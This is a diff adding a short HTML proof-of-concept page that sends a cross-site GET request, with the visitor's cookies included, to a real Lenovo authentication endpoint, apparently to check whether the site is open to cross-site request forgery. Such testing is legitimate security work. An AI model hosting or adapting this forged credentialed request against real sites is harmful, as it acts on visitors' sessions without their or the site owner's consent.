@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Cross Site Test</title>
+</head>
+<body>
+    <h3>Cross-site Request Test (GitHub Pages)</h3>
+    <button onclick="sendRequest()">Send Cross-Site GET Request</button>
+    <div id="result"></div>
+
+    <script>
+        async function sendRequest(){
+            const resultDom = document.getElementById('result');
+            try{
+                const resp = await fetch("https://reg.lenovo.com.cn/auth/set_cookie?cookie=csrf_verify", {
+                    credentials: "include", 
+                    mode: "no-cors"
+                });
+                resultDom.innerText = "Request sent! Open F12 -> Network, check the Request Headers to see if Cookie is attached.";
+            }catch(err){
+                resultDom.innerText = "Error: " + err;
+            }
+        }
+    </script>
+</body>
+</html>
